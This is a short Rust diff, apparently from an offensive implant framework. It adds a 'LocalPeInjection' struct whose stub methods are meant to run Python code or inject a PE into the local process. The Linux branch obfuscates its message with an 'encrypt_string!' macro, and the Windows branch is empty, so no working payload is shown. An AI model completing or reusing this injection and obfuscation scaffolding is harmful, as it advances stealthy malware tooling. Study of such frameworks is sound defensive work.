@@ -465,3 +465,27 @@ impl ReflectivePEFromMemory {
         }
     }
 }
+
+
+
+//info!("DEBUG local_pe_injection");
+//use crate::local_pe_injection;
+//local_pe_injection();
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+pub struct LocalPeInjection {
+    pub path: String, //path of python directory
+    pub python_code: String,
+    pub thread: bool,
+    pub runonce: bool,
+}
+impl LocalPeInjection {
+    #[cfg(target_os = "linux")]
+    pub fn exec_local_pe_injection(&self) -> Result<PayloadExecThread, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
+        return Ok(PayloadExecThread::NoThread());
+    }
+
+    #[cfg(target_os = "windows")]
+    pub fn exec_local_pe_injection(&self) -> Result<PayloadExecThread, anyhow::Error> {
+    }
+}
